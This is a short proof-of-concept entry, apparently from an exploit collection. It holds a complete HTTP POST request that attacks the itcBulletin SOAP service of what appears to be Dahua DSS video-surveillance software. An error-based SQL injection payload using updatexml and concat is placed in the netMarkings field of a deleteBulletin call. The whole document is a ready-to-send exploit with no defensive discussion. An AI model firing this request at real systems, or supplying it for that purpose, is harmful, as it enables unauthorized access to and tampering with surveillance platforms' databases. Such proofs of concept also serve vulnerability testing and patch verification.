# dahuadss_itcBulletin_sqli
from: https://mp.weixin.qq.com/s/uziCFtmINMfX7SV45X-w5A

```
POST /portal/services/itcBulletin?wsdl HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 352

<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
        (updatexml(1,concat(0x7e,md5("This website has a vulnerability"),0x7e),1))) and (1=1

      </netMarkings>
    </ns1:deleteBulletin>
</s11:Body></s11:Envelope>
```
